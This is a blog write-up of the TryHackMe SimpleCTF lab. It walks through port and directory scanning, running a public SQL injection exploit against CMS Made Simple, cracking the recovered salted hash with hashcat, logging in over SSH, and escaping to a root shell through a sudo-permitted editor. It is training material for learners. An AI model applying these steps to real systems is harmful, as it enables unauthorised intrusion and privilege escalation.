---
id: 5574
title: THM SimpleCTF Hints &#038; Writeup
author: Mr Ash
type: "revision"
guid: https://mrash.co/?p=5574
url: "/?p=5574"
---

Welcome back to [TryHackMe](https://tryhackme.com/), this time it’s [SimpleCTF](https://tryhackme.com/room/easyctf)… or as I’d call it ‘Not So SimpleCTF’… as I had a few issues getting this CTF to work.

Let’s dive into it.

## Hints

- How many services are running under port 1000? `nmap`
- What is running on the higher port? Check the `nmap` scan results.
- What’s the CVE you’re using against the application? `CVE-****-****` don’t forget to include `CVE-` at the beginning.
- To what kind of vulnerability is the application vulnerable? `***i` something injection…?
- What’s the password? `hashcat <hash> <wordlist>.txt`
- Where can you log in with the details obtained? Check your `nmap` results again.
- What’s the user flag? `ls` and `cat` what you find.
- Is there any other user in the home directory? What’s its name? `cat /home/`
- What can you leverage to spawn a privileged shell? Check what can be run with `sudo -*`.
- What’s the root flag? `cat /root/root.txt`

## Steps

1. Enumeration as always, start with `nmap -vv -A <ip>`. With ports 21, 80, and 2222 open, we can see what we can find logging into ftp via anonymous via `ftp <ip>`. I didn’t find anything but checking out other writeups, it looks like my THM VM didn’t work as intended.
2. More enumeration, since we have a website, let’s navigate to `http://<ip>` and see what we can find. After manually searching, not a lot there, let’s use `dirsearch -u http://<ip>` to find `/simple/` directory. Navigating to `http://<ip>/simple`, we can find a system called ‘CMS Made Simple’ or CMSMS for short. Find the exploit using `locate 'php/webapps/*****.py'`, then make a copy using `cp /usr/share/exploitdb/exploits/php/webapps/*****.py .`
3. Getting the exploit working, now, this took a bit of time and this makes me call it ‘Not So SimpleCTF’… the correct CVE exploit is written in Python 2 with missing modules that are working in Python3. To fix this, run `sudo apt install 2to3`, then `2to3 *****.py`, this will convert the exploit from Python 2 to Python 3.
4. Using the exploit by running `python *****.py -u http://<ip>/simple`, note this took me twice to get the correct results. I tried a third time and the resulted varied, so you are warned, try a few times to make sure you get consistent results. ![https://p146.p4.n0.cdn.getcloudapp.com/items/kpu8428g/d56f6ace-eb3e-43e5-a402-490dbc1ff3bb.jpeg?v=c6572056b97da622ef551af4c6e6eae2](https://p146.p4.n0.cdn.getcloudapp.com/items/kpu8428g/d56f6ace-eb3e-43e5-a402-490dbc1ff3bb.jpeg?v=c6572056b97da622ef551af4c6e6eae2)
5. Crack the password, use `hashcat -O -a 0 -m 20 '<salt>:<hash>' <wordlist>.txt --show`. To explain, `-m 20` sets `hashcat` to `md5` with `salt:hash` which is perfect from the exploit we ran.
6. Access via `ssh`, run `ssh mitch@10.10.44.147 -p 2222`, don’t forget to specify the port number from the earlier `nmap` scan.
7. Lastly, escalate privileges, now like other steps, this isn’t so simple either, but do your best to not cheat and search around. I’ll give you a hint, you can use a certain text editor as `sudo` which can spawn a bash shell with `:!bash`.

## Reflection

This was a fun CTF from [MrSeth6797](https://tryhackme.com/p/MrSeth6797) ([Twitter](https://twitter.com/0xSeth), [Website](https://floreaiulianpfa.com/), [Writeup](https://floreaiulianpfa.com/simple-ctf/)), I would recommend this to any fellow hacking beginner. I think the basics are always important, this reinforced the importance of searching for known vulns and exploits. And also how exploits can be a bit finicky, like needing to convert the exploit from Python 2 to 3.

I use to get a bit annoyed by rooms like this, where it wasn’t clear with things like this. But after a bit more learning, this is how technology is. Things change, the creator of that exploit wrote it in Python 2, I assume at the time Python 3 wasn’t around. So fast forward to now, our Linux systems have both Python 2 and 3, but modules might only work with 3, not 2.

So yeah, all these sorts of issues become less frustrating the more I learn, and it just becomes a part of the process. I’m also leaning into writeups and the THM Discord more and more. I’ve spent too long banging my head against the wall and going off track. It’s all a part of learning, but writeups can be used in a way that you don’t need to see all the answers, scrolling is a thing.

SimpleCTF is a good, solid CTF from THM, like I said, not so Simple, but in the end, it’s worthwhile. This is day 51 of [\#100DaysOfHacking](https://mrashleyball.com/100daysofhacking/) on my [Hackers Learning Path](https://mrashleyball.com/learning-path-for-beginner-hacker/). [Subscribe](https://go.mrash.co/newsletter) for [CyberSec](https://mrashleyball.com/starting-out-in-cyber-security/) updates or [read](https://mrashleyball.com/blog) more, happy hacking/coding/learning.

## Notes

openvpn issues, in folder w/ ovpn file

```
<pre class="wp-block-code">```
sed -i 's/cipher AES-256-CBC/data-ciphers AES-256-CBC/' *.ovpn

```
```

nmap scan: `nmap -vv -A <ip>`

```
<pre class="wp-block-code">```
Completed NSE at 17:35, 0.00s elapsed
Nmap scan report for 10.10.138.218
Host is up, received syn-ack (0.29s latency).
Scanned at 2022-07-02 17:34:56 EDT for 56s
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE REASON  VERSION
21/tcp   open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.4.33.98
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCj5RwZ5K4QU12jUD81IxGPdEmWFigjRwFNM2pVBCiIPWiMb+R82pdw5dQPFY0JjjicSysFN3pl8ea2L8acocd/7zWke6ce50tpHaDs8OdBYLfpkh+OzAsDwVWSslgKQ7rbi/ck1FF1LIgY7UQdo5FWiTMap7vFnsT/WHL3HcG5Q+el4glnO4xfMMvbRar5WZd4N0ZmcwORyXrEKvulWTOBLcoMGui95Xy7XKCkvpS9RCpJgsuNZ/oau9cdRs0gDoDLTW4S7OI9Nl5obm433k+7YwFeoLnuZnCzegEhgq/bpMo+fXTb/4ILI5bJHJQItH2Ae26iMhJjlFsMqQw0FzLf
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM6Q8K/lDR5QuGRzgfrQSDPYBEBcJ+/2YolisuiGuNIF+1FPOweJy9esTtstZkG3LPhwRDggCp4BP+Gmc92I3eY=
|   256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2I73yryK/Q6UFyvBBMUJEfznlIdBXfnrEqQ3lWdymK
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.

```
```

dirsearch: `dirsearch -u http://<ip>`

```
<pre class="wp-block-code">```
dirsearch -u <http://10.10.138.218>

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/kali/.dirsearch/reports/10.10.138.218/_22-07-02_18-08-57.txt

Error Log: /home/kali/.dirsearch/logs/errors-22-07-02_18-08-57.log

Target: <http://10.10.138.218/>

[18:08:58] Starting: 
[18:09:09] 403 -  299B  - /.ht_wsr.txt                                     
[18:09:09] 403 -  302B  - /.htaccess.bak1
[18:09:09] 403 -  304B  - /.htaccess.sample
[18:09:09] 403 -  302B  - /.htaccess.orig
[18:09:09] 403 -  302B  - /.htaccess.save
[18:09:09] 403 -  303B  - /.htaccess_extra
[18:09:09] 403 -  302B  - /.htaccess_orig
[18:09:09] 403 -  300B  - /.htaccess_sc
[18:09:09] 403 -  300B  - /.htaccessBAK
[18:09:09] 403 -  300B  - /.htaccessOLD
[18:09:09] 403 -  301B  - /.htaccessOLD2
[18:09:09] 403 -  292B  - /.htm                                            
[18:09:09] 403 -  293B  - /.html
[18:09:09] 403 -  302B  - /.htpasswd_test
[18:09:09] 403 -  298B  - /.htpasswds
[18:09:09] 403 -  299B  - /.httr-oauth
[18:09:12] 403 -  292B  - /.php                                            
[18:10:12] 200 -   11KB - /index.html                                       
[18:10:34] 200 -  929B  - /robots.txt                                       
[18:10:35] 403 -  301B  - /server-status                                    
[18:10:35] 403 -  302B  - /server-status/                                   
**[18:10:37] 301 -  315B  - /simple  ->  <http://10.10.138.218/simple/**>         
                                                                             
Task Completed

```
```

Find CVE: `searchsploit ‘CMS Made Simple’`

```
<pre class="wp-block-code">```
CMS Made Simple < 2.2.10 - SQL Injection | php/webapps/*****.py

```
```

Find local CVE file: `locate 'php/webapps/*****.py'`

```
<pre class="wp-block-code">```
/usr/share/exploitdb/exploits/php/webapps/*****.py

```
```

[🔗 CVE](https://www.exploit-db.com/exploits/46635)

Using CVE:

- Ran `sudo apt install 2to3` – exploit written in `python2` has missing modules.
- `2to3 *****.py`, `python *****.py -u http://<ip>/simple` Note, tried multiple times and then randomly worked… didn’t change anything, ghost in shell moment.
- Also, took two attempts to get correct salt and hash, third attempt again produced different set.

```
<pre class="wp-block-code">```
[+] Salt for password found: *****
[+] Username found: *****
[+] Email found: *****
[+] Password found: *****

```
```

Crack Password: `hashcat -O -a 0 -m 20 '<salt>:<hash>' <wordlist>.txt --show`

- Note, salt first, then hashed password, used hint for wordlist.

Connect: `ssh *****@<ip> -p 2222`

PrivEsc: `sudo -*`

```
<pre class="wp-block-code">```
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/*******

```
```

Escalate shell: `sudo ***`, `:!bash`, `cat /root/root.txt`